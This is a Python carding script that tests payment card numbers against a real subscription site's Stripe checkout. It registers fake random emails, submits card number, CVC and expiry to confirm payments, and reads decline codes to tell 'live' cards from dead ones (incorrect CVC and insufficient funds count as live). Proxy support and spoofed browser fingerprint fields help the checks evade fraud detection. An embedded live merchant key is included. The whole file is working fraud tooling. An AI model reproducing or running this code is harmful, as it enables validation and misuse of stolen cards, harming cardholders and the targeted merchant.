import requests, uuid, random, json, time

STRIPE_PK = "pk_live_51Lm3WZDEUIiuNNmxPdoo5hFIsMDYey9ae9WImI2dLAobVf0365C57g5I9MbQvpTjPCZShsIvgkmQpJSrwxUfuMPC00ktjUMj6F"
SUBSCRIBE_URL = "https://yourmove-production-jg7rg.ondigitalocean.app/api/subscribe"

def random_email():
    first = random.choice(["john","james","robert","michael","david"])
    last = random.choice(["smith","johnson","williams","brown","jones"])
    num = random.randint(1, 9999)
    domain = random.choice(["gmail.com", "yahoo.com", "outlook.com"])
    return f"{first}.{last}{num}@{domain}"

def capture(text, start, end):
    try:
        s = text.index(start) + len(start)
        return text[s:text.index(end, s)]
    except ValueError:
        return ""

def check_st15(cc, month, year, cvv, term="monthly", proxy=None):
    try:
        mm = month.zfill(2)
        yy = year[-2:] if len(year) == 4 else year

        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        email = random_email()
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        # 1. Subscribe – get clientSecret
        sub_headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://web.yourmove.ai",
            "referer": "https://web.yourmove.ai/",
            "user-agent": user_agent
        }
        payload = {"email": email, "term": term, "group": 0, "abandon_cart": False, "source": "landing", "campaign": "Home"}
        resp = session.post(SUBSCRIBE_URL, headers=sub_headers, json=payload, timeout=20)
        if resp.status_code not in (200, 201):
            return False, "Subscribe failed"
        client_secret = resp.json().get("clientSecret")
        if not client_secret:
            return False, "No clientSecret"

        # 2. Confirm payment
        pi_id = client_secret.split("_secret_")[0]
        conf_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": user_agent
        }
        data = {
            "return_url": "https://web.yourmove.ai//",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/12427d159a; stripe-js-v3/12427d159a; payment-element; deferred-intent",
            "payment_method_data[referrer]": "https://web.yourmove.ai",
            "payment_method_data[time_on_page]": str(random.randint(30000, 90000)),
            "key": STRIPE_PK,
            "client_secret": client_secret,
            "use_stripe_sdk": "true",
        }
        resp = session.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", headers=conf_headers, data=data, timeout=25)
        raw = resp.text

        # Parse result
        msg1 = capture(raw, '"message": "', '"')
        st   = capture(raw, '"status": "', '"')
        dc   = capture(raw, '"decline_code": "', '"')
        msg  = dc + " - " + msg1 if dc and msg1 else (dc or msg1 or "Unknown error")

        if st == "succeeded":
            return True, "Charged - $15"
        elif st == "requires_action":
            return True, "3D Secure required"
        elif "incorrect_c" in msg.lower():
            return True, msg       # live, wrong CVC
        elif "insufficient_funds" in msg.lower():
            return True, msg       # live, low funds
        else:
            return False, msg

    except Exception as e:
        return False, str(e)[:100]
